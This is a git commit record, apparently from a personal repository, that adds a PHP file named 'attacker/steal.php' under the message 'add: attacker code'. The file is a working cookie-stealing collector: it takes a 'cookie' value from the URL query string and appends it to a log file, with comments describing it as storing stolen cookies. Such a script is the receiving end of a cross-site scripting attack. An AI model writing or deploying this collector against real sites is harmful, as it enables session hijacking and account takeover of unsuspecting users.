1d2c8230706af22eb0e5e75b6ee4340b636903d4
Xyberonzyx7 <advance.houdavid@outlook.com>
2025-03-04 15:37:40 -0800

    add: attacker code

---
+++ attacker/steal.php
@@ -0,0 +1,9 @@
+﻿<?php
+$data = $_GET['cookie']; // Get the stolen cookie from the URL
+$logFile = "log.txt"; // File to store stolen cookies
+
+// Save the stolen cookie into a text file
+file_put_contents($logFile, $data . "\n", FILE_APPEND);
+
+exit();
+?>
